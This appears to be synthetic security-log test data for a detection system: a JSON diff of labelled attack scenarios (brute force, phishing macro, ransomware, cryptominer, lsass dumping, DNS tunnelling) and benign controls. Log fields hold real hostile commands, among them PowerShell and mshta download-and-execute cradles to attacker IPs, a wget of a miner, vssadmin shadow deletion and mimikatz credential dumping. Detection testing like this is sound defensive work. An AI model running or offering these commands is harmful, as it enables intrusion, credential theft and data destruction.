@@ -1,0 +1,166 @@
+[
+  {
+    "_comment": "=== SCENARIO 1: APT-STYLE INTRUSION (185.220.101.45) ===",
+    "_scenario": "External attacker brute forces credentials, establishes C2, moves laterally, exfiltrates data",
+    "_mitre_techniques": ["T1110.001", "T1059.001", "T1105", "T1547.001", "T1021.006", "T1048"]
+  },
+  {"_time": "2026-02-11T08:30:00+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "admin", "host": "DC01", "reason": "Invalid password", "attempt_count": 1, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:02+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "admin", "host": "DC01", "reason": "Invalid password", "attempt_count": 2, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:04+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "admin", "host": "DC01", "reason": "Invalid password", "attempt_count": 3, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:06+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "admin", "host": "DC01", "reason": "Invalid password", "attempt_count": 4, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:08+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "administrator", "host": "DC01", "reason": "Invalid password", "attempt_count": 5, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:10+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "administrator", "host": "DC01", "reason": "Invalid password", "attempt_count": 6, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:12+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "root", "host": "DC01", "reason": "User not found", "attempt_count": 7, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:14+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "backup", "host": "DC01", "reason": "Invalid password", "attempt_count": 8, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:16+05:30", "event_type": "authentication", "action": "failure", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "svc_backup", "host": "DC01", "reason": "Invalid password", "attempt_count": 9, "logon_type": 10, "auth_protocol": "NTLM"},
+  {"_time": "2026-02-11T08:30:18+05:30", "event_type": "authentication", "action": "success", "src_ip": "185.220.101.45", "dest_ip": "10.0.1.50", "user": "svc_backup", "host": "DC01", "reason": "Successful brute force", "attempt_count": 10, "logon_type": 10, "auth_protocol": "NTLM"},
+
+  {"_time": "2026-02-11T08:35:00+05:30", "event_type": "process_creation", "host": "WORKSTATION05", "user": "jsmith", "parent_process": "explorer.exe", "parent_pid": 2048, "process": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=", "pid": 4532, "ppid": 2048, "integrity_level": "Medium", "file_hash": "e99a18c428cb38d5f260853678922e03"},
+  {"_time": "2026-02-11T08:35:05+05:30", "event_type": "network_connection", "host": "WORKSTATION05", "user": "jsmith", "process": "powershell.exe", "pid": 4532, "src_ip": "10.0.2.105", "src_port": 49152, "dest_ip": "185.220.101.45", "dest_port": 443, "protocol": "TCP", "bytes_out": 1024, "bytes_in": 52428, "direction": "outbound"},
+  {"_time": "2026-02-11T08:35:08+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "update-service.net", "query_type": "A", "response": "185.220.101.45", "client_ip": "10.0.2.105", "resolver": "10.0.1.10"},
+  {"_time": "2026-02-11T08:35:10+05:30", "event_type": "file_creation", "host": "WORKSTATION05", "user": "jsmith", "process": "powershell.exe", "pid": 4532, "file_path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe", "file_hash": "a1b2c3d4e5f6789012345678901234567890abcd", "file_size": 245760, "file_type": "PE32 executable"},
+  {"_time": "2026-02-11T08:35:15+05:30", "event_type": "process_creation", "host": "WORKSTATION05", "user": "jsmith", "parent_process": "powershell.exe", "parent_pid": 4532, "process": "svchost.exe", "command_line": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe -connect 185.220.101.45:8443", "pid": 5678, "ppid": 4532, "integrity_level": "Medium"},
+
+  {"_time": "2026-02-11T08:40:00+05:30", "event_type": "registry_modification", "host": "WORKSTATION05", "user": "SYSTEM", "process": "svchost.exe", "pid": 5678, "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "registry_value": "WindowsUpdate", "registry_data": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe", "action": "SetValue"},
+  {"_time": "2026-02-11T08:40:05+05:30", "event_type": "scheduled_task", "host": "WORKSTATION05", "user": "SYSTEM", "task_name": "SystemHealthCheck", "task_path": "\\Microsoft\\Windows\\Maintenance", "action": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe", "trigger": "AtLogon", "run_level": "HighestAvailable"},
+
+  {"_time": "2026-02-11T08:45:00+05:30", "event_type": "process_creation", "host": "WORKSTATION05", "user": "svc_backup", "parent_process": "svchost.exe", "process": "cmd.exe", "command_line": "cmd.exe /c whoami /all > C:\\temp\\whoami.txt", "pid": 6001, "ppid": 5678},
+  {"_time": "2026-02-11T08:45:10+05:30", "event_type": "process_creation", "host": "WORKSTATION05", "user": "svc_backup", "parent_process": "svchost.exe", "process": "net.exe", "command_line": "net.exe group \"Domain Admins\" /domain", "pid": 6002, "ppid": 5678},
+  {"_time": "2026-02-11T08:45:20+05:30", "event_type": "process_creation", "host": "WORKSTATION05", "user": "svc_backup", "parent_process": "svchost.exe", "process": "nltest.exe", "command_line": "nltest.exe /dclist:CORP.LOCAL", "pid": 6003, "ppid": 5678},
+
+  {"_time": "2026-02-11T08:50:00+05:30", "event_type": "lateral_movement", "host": "WORKSTATION05", "user": "svc_backup", "dest_host": "FILESERVER01", "dest_ip": "10.0.1.100", "method": "WMI", "command": "wmic /node:FILESERVER01 process call create \"cmd.exe /c whoami > C:\\temp\\out.txt\"", "success": true},
+  {"_time": "2026-02-11T08:50:10+05:30", "event_type": "lateral_movement", "host": "WORKSTATION05", "user": "svc_backup", "dest_host": "SQLSERVER01", "dest_ip": "10.0.1.101", "method": "PSExec", "command": "psexec \\\\SQLSERVER01 -u svc_backup cmd.exe", "success": true},
+  {"_time": "2026-02-11T08:50:20+05:30", "event_type": "lateral_movement", "host": "WORKSTATION05", "user": "svc_backup", "dest_host": "DC01", "dest_ip": "10.0.1.50", "method": "WinRM", "command": "Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}", "success": true},
+
+  {"_time": "2026-02-11T09:00:00+05:30", "event_type": "process_creation", "host": "FILESERVER01", "user": "svc_backup", "parent_process": "cmd.exe", "process": "7z.exe", "command_line": "7z.exe a -pSecretPass123 C:\\temp\\finance_data.7z C:\\Shares\\Finance\\*", "pid": 7001, "ppid": 7000},
+  {"_time": "2026-02-11T09:00:30+05:30", "event_type": "data_exfiltration", "host": "FILESERVER01", "user": "svc_backup", "process": "7z.exe", "command_line": "7z.exe a -p C:\\temp\\data.7z C:\\Shares\\Finance\\*", "files_accessed": 1547, "total_size_mb": 2048, "archive_created": "C:\\temp\\finance_data.7z"},
+  {"_time": "2026-02-11T09:01:00+05:30", "event_type": "network_connection", "host": "FILESERVER01", "user": "svc_backup", "process": "curl.exe", "src_ip": "10.0.1.100", "dest_ip": "185.220.101.45", "dest_port": 443, "protocol": "TCP", "bytes_out": 2147483648, "bytes_in": 1024, "direction": "outbound"},
+
+  {"_time": "2026-02-11T09:05:00+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "evil-c2-server.com", "query_type": "A", "response": "185.220.101.45", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T09:05:05+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "data-exfil.attacker.net", "query_type": "TXT", "response": "encoded_data_chunk_1", "client_ip": "10.0.2.105"},
+
+  {
+    "_comment": "=== SCENARIO 2: PHISHING/MACRO MALWARE (User: mwilson) ===",
+    "_scenario": "User opens phishing email with malicious Excel macro, downloads secondary payload",
+    "_mitre_techniques": ["T1566.001", "T1204.002", "T1059.005", "T1105", "T1055"]
+  },
+  {"_time": "2026-02-11T10:15:00+05:30", "event_type": "email_received", "host": "WORKSTATION12", "user": "mwilson", "from": "invoice@supplier-payments.net", "to": "mwilson@corp.local", "subject": "Urgent: Invoice #INV-2026-0211 Requires Immediate Payment", "attachment": "Invoice_Feb2026.xlsm", "attachment_hash": "d4e5f6789012345678901234567890abcdef1234", "spam_score": 7.5},
+  {"_time": "2026-02-11T10:16:30+05:30", "event_type": "process_creation", "host": "WORKSTATION12", "user": "mwilson", "parent_process": "outlook.exe", "process": "EXCEL.EXE", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\mwilson\\Downloads\\Invoice_Feb2026.xlsm\"", "pid": 8001, "ppid": 7500},
+  {"_time": "2026-02-11T10:16:45+05:30", "event_type": "process_creation", "host": "WORKSTATION12", "user": "mwilson", "parent_process": "EXCEL.EXE", "process": "mshta.exe", "command_line": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage2.ps1')\"\", 0:close\")", "pid": 8002, "ppid": 8001},
+  {"_time": "2026-02-11T10:16:50+05:30", "event_type": "process_creation", "host": "WORKSTATION12", "user": "mwilson", "parent_process": "mshta.exe", "process": "powershell.exe", "command_line": "powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage2.ps1')", "pid": 8003, "ppid": 8002},
+  {"_time": "2026-02-11T10:16:55+05:30", "event_type": "network_connection", "host": "WORKSTATION12", "user": "mwilson", "process": "powershell.exe", "pid": 8003, "src_ip": "10.0.2.112", "dest_ip": "45.33.32.156", "dest_port": 80, "protocol": "TCP", "bytes_out": 256, "bytes_in": 18432},
+  {"_time": "2026-02-11T10:17:00+05:30", "event_type": "file_creation", "host": "WORKSTATION12", "user": "mwilson", "process": "powershell.exe", "pid": 8003, "file_path": "C:\\Users\\mwilson\\AppData\\Roaming\\Microsoft\\msupdate.exe", "file_hash": "b2c3d4e5f6789012345678901234567890abcdef", "file_size": 352256},
+  {"_time": "2026-02-11T10:17:05+05:30", "event_type": "process_creation", "host": "WORKSTATION12", "user": "mwilson", "parent_process": "powershell.exe", "process": "msupdate.exe", "command_line": "C:\\Users\\mwilson\\AppData\\Roaming\\Microsoft\\msupdate.exe", "pid": 8004, "ppid": 8003},
+  {"_time": "2026-02-11T10:17:15+05:30", "event_type": "process_injection", "host": "WORKSTATION12", "user": "mwilson", "source_process": "msupdate.exe", "source_pid": 8004, "target_process": "explorer.exe", "target_pid": 2100, "injection_type": "CreateRemoteThread"},
+  {"_time": "2026-02-11T10:17:30+05:30", "event_type": "network_connection", "host": "WORKSTATION12", "user": "mwilson", "process": "explorer.exe", "pid": 2100, "src_ip": "10.0.2.112", "dest_ip": "45.33.32.156", "dest_port": 443, "protocol": "TCP", "bytes_out": 512, "bytes_in": 1024, "direction": "outbound"},
+
+  {
+    "_comment": "=== SCENARIO 3: INSIDER THREAT (User: disgruntled_dave) ===",
+    "_scenario": "Employee accesses sensitive data outside normal hours, copies to USB",
+    "_mitre_techniques": ["T1078", "T1530", "T1052.001", "T1567"]
+  },
+  {"_time": "2026-02-11T02:30:00+05:30", "event_type": "authentication", "action": "success", "src_ip": "10.0.2.150", "dest_ip": "10.0.1.50", "user": "disgruntled_dave", "host": "WORKSTATION22", "reason": "After-hours login", "logon_type": 2, "auth_protocol": "Kerberos"},
+  {"_time": "2026-02-11T02:31:00+05:30", "event_type": "file_access", "host": "FILESERVER01", "user": "disgruntled_dave", "action": "read", "file_path": "\\\\FILESERVER01\\HR\\Salary_Data_2026.xlsx", "file_size": 2458624, "access_type": "network"},
+  {"_time": "2026-02-11T02:31:30+05:30", "event_type": "file_access", "host": "FILESERVER01", "user": "disgruntled_dave", "action": "read", "file_path": "\\\\FILESERVER01\\HR\\Employee_SSN_List.csv", "file_size": 145920, "access_type": "network"},
+  {"_time": "2026-02-11T02:32:00+05:30", "event_type": "file_access", "host": "FILESERVER01", "user": "disgruntled_dave", "action": "read", "file_path": "\\\\FILESERVER01\\Finance\\Q4_Revenue_Confidential.xlsx", "file_size": 5242880, "access_type": "network"},
+  {"_time": "2026-02-11T02:32:30+05:30", "event_type": "file_access", "host": "FILESERVER01", "user": "disgruntled_dave", "action": "read", "file_path": "\\\\FILESERVER01\\Legal\\Merger_Plans_2026.docx", "file_size": 1048576, "access_type": "network"},
+  {"_time": "2026-02-11T02:33:00+05:30", "event_type": "usb_device", "host": "WORKSTATION22", "user": "disgruntled_dave", "action": "connected", "device_type": "Mass Storage", "device_name": "SanDisk Ultra USB 3.0", "device_id": "USB\\VID_0781&PID_5581", "drive_letter": "E:"},
+  {"_time": "2026-02-11T02:33:30+05:30", "event_type": "file_copy", "host": "WORKSTATION22", "user": "disgruntled_dave", "source": "\\\\FILESERVER01\\HR\\Salary_Data_2026.xlsx", "destination": "E:\\backup\\Salary_Data_2026.xlsx", "file_size": 2458624},
+  {"_time": "2026-02-11T02:34:00+05:30", "event_type": "file_copy", "host": "WORKSTATION22", "user": "disgruntled_dave", "source": "\\\\FILESERVER01\\HR\\Employee_SSN_List.csv", "destination": "E:\\backup\\Employee_SSN_List.csv", "file_size": 145920},
+  {"_time": "2026-02-11T02:34:30+05:30", "event_type": "file_copy", "host": "WORKSTATION22", "user": "disgruntled_dave", "source": "\\\\FILESERVER01\\Legal\\Merger_Plans_2026.docx", "destination": "E:\\backup\\Merger_Plans_2026.docx", "file_size": 1048576},
+  {"_time": "2026-02-11T02:35:00+05:30", "event_type": "usb_device", "host": "WORKSTATION22", "user": "disgruntled_dave", "action": "disconnected", "device_type": "Mass Storage", "device_name": "SanDisk Ultra USB 3.0"},
+  {"_time": "2026-02-11T02:36:00+05:30", "event_type": "authentication", "action": "logoff", "src_ip": "10.0.2.150", "dest_ip": "10.0.1.50", "user": "disgruntled_dave", "host": "WORKSTATION22"},
+
+  {
+    "_comment": "=== SCENARIO 4: RANSOMWARE ATTACK (Attacker IP: 91.219.236.222) ===",
+    "_scenario": "Ransomware deployed via RDP brute force, shadow copies deleted, files encrypted",
+    "_mitre_techniques": ["T1110.001", "T1021.001", "T1490", "T1486", "T1489"]
+  },
+  {"_time": "2026-02-11T11:00:00+05:30", "event_type": "authentication", "action": "failure", "src_ip": "91.219.236.222", "dest_ip": "10.0.1.200", "user": "admin", "host": "WEBSERVER01", "reason": "Invalid password", "logon_type": 10, "service": "RDP"},
+  {"_time": "2026-02-11T11:00:05+05:30", "event_type": "authentication", "action": "failure", "src_ip": "91.219.236.222", "dest_ip": "10.0.1.200", "user": "administrator", "host": "WEBSERVER01", "reason": "Invalid password", "logon_type": 10, "service": "RDP"},
+  {"_time": "2026-02-11T11:00:10+05:30", "event_type": "authentication", "action": "failure", "src_ip": "91.219.236.222", "dest_ip": "10.0.1.200", "user": "webadmin", "host": "WEBSERVER01", "reason": "Invalid password", "logon_type": 10, "service": "RDP"},
+  {"_time": "2026-02-11T11:00:15+05:30", "event_type": "authentication", "action": "success", "src_ip": "91.219.236.222", "dest_ip": "10.0.1.200", "user": "webadmin", "host": "WEBSERVER01", "reason": "Weak password compromised", "logon_type": 10, "service": "RDP"},
+  {"_time": "2026-02-11T11:01:00+05:30", "event_type": "process_creation", "host": "WEBSERVER01", "user": "webadmin", "parent_process": "explorer.exe", "process": "cmd.exe", "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet", "pid": 9001, "ppid": 2500},
+  {"_time": "2026-02-11T11:01:05+05:30", "event_type": "process_creation", "host": "WEBSERVER01", "user": "webadmin", "parent_process": "cmd.exe", "process": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "pid": 9002, "ppid": 9001},
+  {"_time": "2026-02-11T11:01:10+05:30", "event_type": "shadow_copy_deletion", "host": "WEBSERVER01", "user": "webadmin", "process": "vssadmin.exe", "shadows_deleted": 5, "volumes_affected": ["C:", "D:"]},
+  {"_time": "2026-02-11T11:01:15+05:30", "event_type": "process_creation", "host": "WEBSERVER01", "user": "webadmin", "parent_process": "cmd.exe", "process": "wmic.exe", "command_line": "wmic.exe shadowcopy delete", "pid": 9003, "ppid": 9001},
+  {"_time": "2026-02-11T11:01:30+05:30", "event_type": "process_creation", "host": "WEBSERVER01", "user": "webadmin", "parent_process": "cmd.exe", "process": "bcdedit.exe", "command_line": "bcdedit.exe /set {default} recoveryenabled No", "pid": 9004, "ppid": 9001},
+  {"_time": "2026-02-11T11:02:00+05:30", "event_type": "service_stop", "host": "WEBSERVER01", "user": "webadmin", "service_name": "VSS", "service_display_name": "Volume Shadow Copy", "stop_reason": "Ransomware preparation"},
+  {"_time": "2026-02-11T11:02:05+05:30", "event_type": "service_stop", "host": "WEBSERVER01", "user": "webadmin", "service_name": "MSSQLSERVER", "service_display_name": "SQL Server", "stop_reason": "Ransomware preparation"},
+  {"_time": "2026-02-11T11:02:30+05:30", "event_type": "file_creation", "host": "WEBSERVER01", "user": "webadmin", "process": "cmd.exe", "file_path": "C:\\Windows\\Temp\\locker.exe", "file_hash": "c3d4e5f6789012345678901234567890abcdef12", "file_size": 524288},
+  {"_time": "2026-02-11T11:02:35+05:30", "event_type": "process_creation", "host": "WEBSERVER01", "user": "webadmin", "parent_process": "cmd.exe", "process": "locker.exe", "command_line": "C:\\Windows\\Temp\\locker.exe --encrypt-all --extension .locked", "pid": 9005, "ppid": 9001},
+  {"_time": "2026-02-11T11:03:00+05:30", "event_type": "file_modification", "host": "WEBSERVER01", "user": "SYSTEM", "process": "locker.exe", "files_encrypted": 15847, "extensions_targeted": [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".sql", ".bak"], "encryption_extension": ".locked"},
+  {"_time": "2026-02-11T11:10:00+05:30", "event_type": "file_creation", "host": "WEBSERVER01", "user": "SYSTEM", "process": "locker.exe", "file_path": "C:\\README_RESTORE_FILES.txt", "content": "Your files have been encrypted. Pay 2 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "file_size": 2048},
+
+  {
+    "_comment": "=== SCENARIO 5: CRYPTOMINER DEPLOYMENT ===",
+    "_scenario": "Vulnerable web app exploited, cryptominer deployed for persistent mining",
+    "_mitre_techniques": ["T1190", "T1059.004", "T1496", "T1053.003"]
+  },
+  {"_time": "2026-02-11T12:00:00+05:30", "event_type": "web_attack", "host": "WEBSERVER02", "src_ip": "198.51.100.50", "dest_ip": "10.0.1.201", "dest_port": 443, "method": "POST", "uri": "/api/upload?file=../../../../../../tmp/shell.php", "user_agent": "curl/7.68.0", "attack_type": "path_traversal", "response_code": 200},
+  {"_time": "2026-02-11T12:00:30+05:30", "event_type": "web_attack", "host": "WEBSERVER02", "src_ip": "198.51.100.50", "dest_ip": "10.0.1.201", "dest_port": 443, "method": "GET", "uri": "/tmp/shell.php?cmd=id", "user_agent": "curl/7.68.0", "attack_type": "webshell_access", "response_code": 200},
+  {"_time": "2026-02-11T12:01:00+05:30", "event_type": "process_creation", "host": "WEBSERVER02", "user": "www-data", "parent_process": "apache2", "process": "sh", "command_line": "sh -c wget http://198.51.100.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig", "pid": 10001, "ppid": 1500},
+  {"_time": "2026-02-11T12:01:10+05:30", "event_type": "network_connection", "host": "WEBSERVER02", "user": "www-data", "process": "wget", "src_ip": "10.0.1.201", "dest_ip": "198.51.100.50", "dest_port": 80, "protocol": "TCP", "bytes_in": 4194304, "direction": "outbound"},
+  {"_time": "2026-02-11T12:01:30+05:30", "event_type": "file_creation", "host": "WEBSERVER02", "user": "www-data", "process": "wget", "file_path": "/tmp/xmrig", "file_hash": "d4e5f6789012345678901234567890abcdef1234", "file_size": 4194304, "file_permissions": "755"},
+  {"_time": "2026-02-11T12:02:00+05:30", "event_type": "process_creation", "host": "WEBSERVER02", "user": "www-data", "parent_process": "sh", "process": "xmrig", "command_line": "/tmp/xmrig -o pool.supportxmr.com:443 -u 49VSh... -p x --tls", "pid": 10002, "ppid": 10001},
+  {"_time": "2026-02-11T12:02:30+05:30", "event_type": "network_connection", "host": "WEBSERVER02", "user": "www-data", "process": "xmrig", "src_ip": "10.0.1.201", "dest_ip": "51.79.173.212", "dest_port": 443, "protocol": "TCP", "bytes_out": 1024, "bytes_in": 2048, "connection_type": "mining_pool"},
+  {"_time": "2026-02-11T12:03:00+05:30", "event_type": "cron_job", "host": "WEBSERVER02", "user": "www-data", "cron_entry": "* * * * * /tmp/xmrig -o pool.supportxmr.com:443 -u 49VSh... -p x --tls", "action": "created"},
+  {"_time": "2026-02-11T12:10:00+05:30", "event_type": "system_performance", "host": "WEBSERVER02", "cpu_usage": 98.5, "process": "xmrig", "memory_mb": 512, "alert": "High CPU usage detected"},
+
+  {
+    "_comment": "=== SCENARIO 6: NORMAL/BENIGN ACTIVITY (For False Positive Testing) ===",
+    "_scenario": "Legitimate admin activity, scheduled tasks, normal operations",
+    "_mitre_techniques": []
+  },
+  {"_time": "2026-02-11T09:00:00+05:30", "event_type": "authentication", "action": "success", "src_ip": "10.0.2.10", "dest_ip": "10.0.1.50", "user": "it_admin", "host": "DC01", "reason": "Normal admin login", "logon_type": 10, "auth_protocol": "Kerberos"},
+  {"_time": "2026-02-11T09:01:00+05:30", "event_type": "process_creation", "host": "ADMIN-PC", "user": "it_admin", "parent_process": "explorer.exe", "process": "powershell.exe", "command_line": "powershell.exe Get-Service | Where-Object {$_.Status -eq 'Running'}", "pid": 11001, "ppid": 2000, "integrity_level": "High"},
+  {"_time": "2026-02-11T09:02:00+05:30", "event_type": "process_creation", "host": "ADMIN-PC", "user": "it_admin", "parent_process": "powershell.exe", "process": "gpupdate.exe", "command_line": "gpupdate.exe /force", "pid": 11002, "ppid": 11001},
+  {"_time": "2026-02-11T09:05:00+05:30", "event_type": "process_creation", "host": "ADMIN-PC", "user": "it_admin", "parent_process": "explorer.exe", "process": "mmc.exe", "command_line": "mmc.exe C:\\Windows\\System32\\compmgmt.msc", "pid": 11003, "ppid": 2000},
+  {"_time": "2026-02-11T09:10:00+05:30", "event_type": "scheduled_task", "host": "DC01", "user": "SYSTEM", "task_name": "Backup-DomainControllers", "task_path": "\\Microsoft\\Windows\\Backup", "action": "wbadmin start backup", "trigger": "Daily at 03:00", "legitimate": true},
+  {"_time": "2026-02-11T09:15:00+05:30", "event_type": "software_update", "host": "WORKSTATION05", "user": "SYSTEM", "process": "wuauclt.exe", "update_kb": "KB5034441", "update_title": "2026-02 Cumulative Update for Windows 11", "action": "installed"},
+  {"_time": "2026-02-11T09:20:00+05:30", "event_type": "process_creation", "host": "FILESERVER01", "user": "backup_svc", "parent_process": "services.exe", "process": "robocopy.exe", "command_line": "robocopy.exe D:\\Shares E:\\Backup\\Daily /MIR /R:3", "pid": 11004, "ppid": 500, "legitimate": true},
+  {"_time": "2026-02-11T09:30:00+05:30", "event_type": "authentication", "action": "success", "src_ip": "10.0.2.50", "dest_ip": "10.0.1.50", "user": "helpdesk_user", "host": "HELPDESK01", "reason": "Normal user login", "logon_type": 2},
+  {"_time": "2026-02-11T09:35:00+05:30", "event_type": "process_creation", "host": "HELPDESK01", "user": "helpdesk_user", "parent_process": "explorer.exe", "process": "mstsc.exe", "command_line": "mstsc.exe /v:WORKSTATION05", "pid": 11005, "ppid": 2000, "legitimate": true},
+
+  {
+    "_comment": "=== SCENARIO 7: CREDENTIAL DUMPING (LSASS ACCESS) ===",
+    "_scenario": "Attacker dumps credentials from memory using mimikatz-style tool",
+    "_mitre_techniques": ["T1003.001", "T1003.002", "T1003.003"]
+  },
+  {"_time": "2026-02-11T13:00:00+05:30", "event_type": "process_creation", "host": "DC01", "user": "svc_backup", "parent_process": "cmd.exe", "process": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe lsass.dmp", "pid": 12001, "ppid": 12000},
+  {"_time": "2026-02-11T13:00:10+05:30", "event_type": "lsass_access", "host": "DC01", "user": "svc_backup", "source_process": "procdump.exe", "source_pid": 12001, "target_process": "lsass.exe", "target_pid": 672, "access_type": "PROCESS_ALL_ACCESS", "granted": true},
+  {"_time": "2026-02-11T13:00:30+05:30", "event_type": "file_creation", "host": "DC01", "user": "svc_backup", "process": "procdump.exe", "file_path": "C:\\Windows\\Temp\\lsass.dmp", "file_size": 67108864, "file_hash": "e5f6789012345678901234567890abcdef123456"},
+  {"_time": "2026-02-11T13:01:00+05:30", "event_type": "process_creation", "host": "DC01", "user": "svc_backup", "parent_process": "cmd.exe", "process": "mimikatz.exe", "command_line": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit", "pid": 12002, "ppid": 12000},
+  {"_time": "2026-02-11T13:01:30+05:30", "event_type": "credential_access", "host": "DC01", "user": "svc_backup", "process": "mimikatz.exe", "credentials_extracted": 15, "users_affected": ["Administrator", "krbtgt", "svc_backup", "it_admin"]},
+
+  {
+    "_comment": "=== SCENARIO 8: DNS TUNNELING ===",
+    "_scenario": "Data exfiltration via DNS queries to attacker-controlled domain",
+    "_mitre_techniques": ["T1071.004", "T1048.003"]
+  },
+  {"_time": "2026-02-11T14:00:00+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "aGVsbG8gd29ybGQ.data.evil-dns-tunnel.com", "query_type": "TXT", "response": "ack", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T14:00:01+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "dGhpcyBpcyBhIHRlc3Q.data.evil-dns-tunnel.com", "query_type": "TXT", "response": "ack", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T14:00:02+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "c2Vuc2l0aXZlIGRhdGE.data.evil-dns-tunnel.com", "query_type": "TXT", "response": "ack", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T14:00:03+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "cGFzc3dvcmQgaGFzaA.data.evil-dns-tunnel.com", "query_type": "TXT", "response": "ack", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T14:00:04+05:30", "event_type": "dns_query", "host": "WORKSTATION05", "query": "Y3JlZGVudGlhbHM.data.evil-dns-tunnel.com", "query_type": "TXT", "response": "ack", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T14:01:00+05:30", "event_type": "dns_anomaly", "host": "DNS-SERVER", "alert": "High volume of TXT queries to single domain", "domain": "evil-dns-tunnel.com", "query_count": 500, "unique_subdomains": 487, "client_ip": "10.0.2.105"},
+
+  {
+    "_comment": "=== SCENARIO 9: KERBEROASTING ===",
+    "_scenario": "Attacker requests service tickets for offline cracking",
+    "_mitre_techniques": ["T1558.003"]
+  },
+  {"_time": "2026-02-11T15:00:00+05:30", "event_type": "kerberos_tgs_request", "host": "DC01", "user": "svc_backup", "service": "MSSQLSvc/SQLSERVER01.corp.local:1433", "encryption_type": "RC4_HMAC", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T15:00:05+05:30", "event_type": "kerberos_tgs_request", "host": "DC01", "user": "svc_backup", "service": "HTTP/WEBSERVER01.corp.local", "encryption_type": "RC4_HMAC", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T15:00:10+05:30", "event_type": "kerberos_tgs_request", "host": "DC01", "user": "svc_backup", "service": "HTTP/SHAREPOINT.corp.local", "encryption_type": "RC4_HMAC", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T15:00:15+05:30", "event_type": "kerberos_tgs_request", "host": "DC01", "user": "svc_backup", "service": "CIFS/FILESERVER01.corp.local", "encryption_type": "RC4_HMAC", "client_ip": "10.0.2.105"},
+  {"_time": "2026-02-11T15:00:20+05:30", "event_type": "kerberos_anomaly", "host": "DC01", "alert": "Multiple TGS requests with RC4 encryption from single user", "user": "svc_backup", "service_count": 4, "timeframe_seconds": 20},
+
+  {
+    "_comment": "=== ADDITIONAL NETWORK CONNECTIONS ===",
+    "_scenario": "Various network activities for context"
+  },
+  {"_time": "2026-02-11T08:00:00+05:30", "event_type": "network_connection", "host": "WORKSTATION05", "user": "jsmith", "process": "chrome.exe", "src_ip": "10.0.2.105", "dest_ip": "142.250.185.78", "dest_port": 443, "protocol": "TCP", "bytes_out": 15000, "bytes_in": 250000, "domain": "google.com"},
+  {"_time": "2026-02-11T08:05:00+05:30", "event_type": "network_connection", "host": "WORKSTATION12", "user": "mwilson", "process": "outlook.exe", "src_ip": "10.0.2.112", "dest_ip": "52.97.151.18", "dest_port": 443, "protocol": "TCP", "bytes_out": 5000, "bytes_in": 120000, "domain": "outlook.office365.com"},
